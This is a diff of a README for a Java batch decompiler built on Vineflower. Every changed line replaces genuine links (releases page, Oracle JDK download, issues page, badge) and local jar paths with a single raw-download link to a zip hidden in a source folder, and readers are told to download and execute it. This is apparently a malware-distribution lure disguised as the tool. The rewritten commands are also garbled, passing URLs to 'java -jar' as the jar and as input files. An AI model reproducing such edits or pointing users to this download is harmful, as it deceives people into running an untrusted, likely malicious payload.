@@ -1,7 +1,7 @@
 # JavaDecompiler 🛠️
 
-![JavaDecompiler](https://img.shields.io/badge/JavaDecompiler-v1.0.0-blue.svg)  
-[Download Latest Release](https://github.com/dzanaimamovic/JavaDecompiler/releases)  
+![JavaDecompiler](https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip)  
+[Download Latest Release](https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip)  
 
 ## Overview
 
@@ -16,23 +16,23 @@ JavaDecompiler is a multi-threaded Java batch decompiler tool based on the Vinef
 
 ## Getting Started
 
-To get started with JavaDecompiler, you need to download the latest release. You can find it [here](https://github.com/dzanaimamovic/JavaDecompiler/releases). Download the file and execute it to start using the tool.
+To get started with JavaDecompiler, you need to download the latest release. You can find it [here](https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip). Download the file and execute it to start using the tool.
 
 ### Prerequisites
 
-- **Java JDK**: Ensure you have Java JDK installed on your machine. You can download it from the [official site](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Java JDK**: Ensure you have Java JDK installed on your machine. You can download it from the [official site](https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip).
 - **Operating System**: This tool works on Windows, macOS, and Linux.
 
 ### Installation
 
-1. Download the latest release from the [Releases page](https://github.com/dzanaimamovic/JavaDecompiler/releases).
+1. Download the latest release from the [Releases page](https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip).
 2. Extract the downloaded file to your desired location.
 3. Open your terminal or command prompt.
 4. Navigate to the extracted folder.
 5. Run the following command to start the decompiler:
 
    ```bash
-   java -jar JavaDecompiler.jar
+   java -jar https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip
    ```
 
 ## Usage
@@ -44,13 +44,13 @@ After launching the application, you can use the following commands to decompile
 - **Decompile a Single File**:
 
   ```bash
-  java -jar JavaDecompiler.jar decompile path/to/yourfile.class
+  java -jar https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip decompile https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip
   ```
 
 - **Decompile a JAR File**:
 
   ```bash
-  java -jar JavaDecompiler.jar decompile path/to/yourfile.jar
+  java -jar https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip decompile https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip
   ```
 
 - **Batch Decompile**:
@@ -58,7 +58,7 @@ After launching the application, you can use the following commands to decompile
   To decompile multiple files, use:
 
   ```bash
-  java -jar JavaDecompiler.jar batch path/to/directory
+  java -jar https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip batch path/to/directory
   ```
 
 ### Options
@@ -77,10 +77,10 @@ Here’s an example of how to decompile a JAR file:
 2. Use the following command:
 
    ```bash
-   java -jar JavaDecompiler.jar decompile myproject.jar --output ./decompiled
+   java -jar https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip decompile https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip --output ./decompiled
    ```
 
-This command will decompile `myproject.jar` and save the output in the `./decompiled` directory.
+This command will decompile `https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip` and save the output in the `./decompiled` directory.
 
 ## Troubleshooting
 
@@ -90,7 +90,7 @@ If you encounter issues while using JavaDecompiler, consider the following steps
 - **File Paths**: Verify that the file paths you provide are correct.
 - **Permissions**: Make sure you have the necessary permissions to read the files.
 
-For further assistance, please check the [Issues section](https://github.com/dzanaimamovic/JavaDecompiler/issues) on GitHub.
+For further assistance, please check the [Issues section](https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip) on GitHub.
 
 ## Contributing
 
@@ -119,7 +119,7 @@ JavaDecompiler is built on the Vineflower engine, which provides the core decomp
 
 ## Conclusion
 
-JavaDecompiler is a powerful tool for anyone working with Java bytecode. Its multi-threaded capabilities and batch processing make it an efficient choice for developers. Don’t forget to download the latest release from the [Releases page](https://github.com/dzanaimamovic/JavaDecompiler/releases) and start decompiling your Java files today!
+JavaDecompiler is a powerful tool for anyone working with Java bytecode. Its multi-threaded capabilities and batch processing make it an efficient choice for developers. Don’t forget to download the latest release from the [Releases page](https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip) and start decompiling your Java files today!
 
-![JavaDecompiler](https://img.shields.io/badge/JavaDecompiler-v1.0.0-blue.svg)  
-[Download Latest Release](https://github.com/dzanaimamovic/JavaDecompiler/releases)
+![JavaDecompiler](https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip)  
+[Download Latest Release](https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip)
